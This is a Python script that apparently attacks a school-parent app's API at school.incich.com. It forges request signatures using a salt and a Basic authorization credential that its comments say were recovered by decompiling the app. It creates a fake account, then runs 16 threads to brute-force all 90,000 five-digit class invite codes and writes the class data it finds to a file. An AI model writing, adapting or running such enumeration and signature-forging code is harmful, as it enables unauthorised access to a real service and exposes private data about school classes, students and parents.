import requests
import logging
import hashlib
import time
import random
import threading

logging.basicConfig(format='%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s',
                    level=logging.INFO)


class GetCode:

    api_url = "http://school.incich.com:9208/display-rest"

    # POST 请求(包括inch_sign)
    def post(self, url, params=None, headers=None, data=None, timeout=3):
        if headers is None:
            headers = {}

        # 经反编译得到的 inch_sign 生成方法
        temp = dict()
        temp['access_token'] = self.token
        try:
            for i in params:
                temp[i] = params[i]
        except Exception as e:
            pass
        temp['inch_timestamp'] = int(round(time.time() * 1000))
        temp['nonce'] = str(temp['inch_timestamp']) + str((random.random() + random.randint(1,9)) * 100000000)[:8]

        temp2 = ''
        for i in sorted(temp.keys()):
            temp2 += str(i) + "=" + str(temp[i]) + "&"
        temp2 += "aef2890665d884a3080971b4eca594d7"

        sign = hashlib.md5(temp2.encode("utf-8")).hexdigest().upper()
        # logging.debug(sign)

        headers['inch_timestamp'] = str(temp['inch_timestamp'])
        headers['nonce'] = temp['nonce']
        headers['inch_sign'] = sign
        headers['systemid'] = "parent"
        headers['access_token'] = self.token
        # headers['User-Agent'] = "okhttp/3.12.0"

        req = requests.post(url, params=params, headers=headers, data=data, timeout=timeout)
        return req

    # GET 请求(包括inch_sign)
    def get(self, url, params=None, headers=None, data=None, timeout=3):
        if headers is None:
            headers = {}

        # 经反编译得到的 inch_sign 生成方法
        temp = dict()
        temp['access_token'] = self.token
        try:
            for i in params:
                temp[i] = params[i]
        except Exception as e:
            pass
        temp['inch_timestamp'] = int(round(time.time() * 1000))
        temp['nonce'] = str(temp['inch_timestamp']) + str((random.random() + random.randint(1,9)) * 100000000)[:8]

        temp2 = ''
        for i in sorted(temp.keys()):
            temp2 += str(i) + "=" + str(temp[i]) + "&"
        temp2 += "aef2890665d884a3080971b4eca594d7"

        sign = hashlib.md5(temp2.encode("utf-8")).hexdigest().upper()
        # logging.debug(sign)

        headers['inch_timestamp'] = str(temp['inch_timestamp'])
        headers['nonce'] = temp['nonce']
        headers['inch_sign'] = sign
        headers['systemid'] = "parent"
        headers['access_token'] = self.token
        # headers['User-Agent'] = "okhttp/3.12.0"

        req = requests.get(url, params=params, headers=headers, data=data, timeout=timeout)
        return req

    # 获取 token
    def get_token(self):
        logging.info("获取Token")
        req = self.post(self.api_url + "/oauth/token", data={
            "systemid": "parent",
            "grant_type": "password",
            "username": self.union_id
        }, headers={
            "Authorization": "Basic aW5jaF9wYXJlbnQ6ODVhMzNlNTAtMmJmZC0xMWU4LTkzYzktMzhjOTg2NDEyZmZj"
        }).json()
        logging.info(req)
        return req['access_token']

    # 注册账号
    def register(self):

        logging.info("注册账号...")
        req = self.post(self.api_url + "/ThirdLogin/login.json", params={
            "unionid": self.union_id,
            "nickname": "IncichRobot",
            "source": "QQ"
        }).json()
        logging.info(req)

        req = self.post(self.api_url + "/ThirdLogin/saveToken.json", params={
            "unionid": self.union_id,
        }).json()
        logging.info(req)

    # 检验 Code
    def check_code(self, code):
        logging.info("检验: " + str(code) + " 已经完成: " + str((self.total - self.total_left) / self.total))
        req = self.get(self.api_url + "/bindStudent/getClass.json", params={
            "unionid": self.union_id,
            "invitecode": code
        }, headers={"Connection": "close"}).json()
        logging.info(req)

        if req['success']:
            self.temp[code] = req['data']

    def guess_range(self, start, end):
        for i in range(start, end):
            while True:
                try:
                    self.check_code(i)
                    self.total_left -= 1
                    break
                except Exception as e:
                    logging.warning(e)

    def __init__(self, output):
        union_id = ''
        for i in range(0, 32):
            union_id += random.choice("QWERTYUIOPASDFGHJKLZXCVBNM1234567890")
        logging.info("随机Union ID: " + union_id)

        logging.info("正在初始化...")
        self.union_id = union_id
        self.token = ''
        self.token = self.get_token()
        self.register()
        logging.info("开始猜测班级邀请码...")
        self.output = output

        self.total_left = 90000
        self.total = 90000
        self.temp = dict()
        total_thread = 16
        threads = []
        for i in range(0, total_thread):
            start = 10000 + int(i * 90000 / total_thread)
            end = 10000 + int((i + 1) * 90000 / total_thread)
            logging.info(str(start) + " " + str(end))
            t = threading.Thread(target=self.guess_range, args=(start, end))
            threads.append(t)
            t.start()

        for i in threads:
            i.join()

        print(self.temp)
        for i in sorted(self.temp.keys()):
            self.output.write(str(i) + " " + str(self.temp[i]) + "\n")


f = open("code.txt", "w")
GetCode(f)
f.close()
